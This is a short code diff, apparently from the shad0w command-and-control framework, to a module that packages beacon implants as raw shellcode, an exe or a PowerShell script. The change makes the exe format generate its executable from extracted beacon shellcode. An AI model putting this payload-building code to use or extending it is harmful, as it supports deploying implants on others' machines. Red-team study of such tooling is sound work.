@@ -3,6 +3,8 @@
 import tempfile
 
 from lib import buildtools
+
+from lib.templates import exe
 from lib.templates import powershell
 
 formats = ('raw', 'exe', 'psh')
@@ -12,7 +14,7 @@ def get_size(filename):
     with open(filename, 'rb') as file:
         return len(file.read())
 
-def format_raw(builder, length=True, code=False):    
+def format_raw(builder, length=True, code=False):
     # extract the shellcode from the new beacon
     rcode = buildtools.extract_shellcode()
 
@@ -21,25 +23,33 @@ def format_raw(builder, length=True, code=False):
 
     if length:
         return get_size(builder.outfile)
-    
+
     if code:
         return rcode
 
 def format_exe(builder, length=True, code=False):
     # get the bytes of the exe
-    with open("/root/shad0w/beacon/beacon.exe", 'rb') as file:
-        rcode = file.read()
+    # with open("/root/shad0w/beacon/beacon.exe", 'rb') as file:
+    #     rcode = file.read()
 
     # then give them the exe and bridge it
-    length = buildtools.write_and_bridge(builder.outfile, rcode)
+    # length = buildtools.write_and_bridge(builder.outfile, rcode)
+
+    # get the the beacon shellcode
+    rcode = format_raw(builder, length=False, code=True)
+
+    # create an exe from the shellcode
+    ecode = exe.generate(rcode, debug=builder.debugv)
+
+    length = buildtools.write_and_bridge(builder.outfile, ecode)
 
     # shrink the finally binary
     if not builder.no_shrink:
         length = buildtools.shrink_exe(builder.outfile)
-    
+
     if length:
         return length
-    
+
     if code:
         with open(builder.outfile, 'rb') as file:
             return file.read()
@@ -59,12 +69,12 @@ def format_powershell(builder, length=True, code=False):
 
     with open(outfile, "w") as file:
         file.write(pcode)
-    
+
     builder.outfile = outfile
 
     if length:
         return len(pcode)
-    
+
     if code:
         return pcode
 
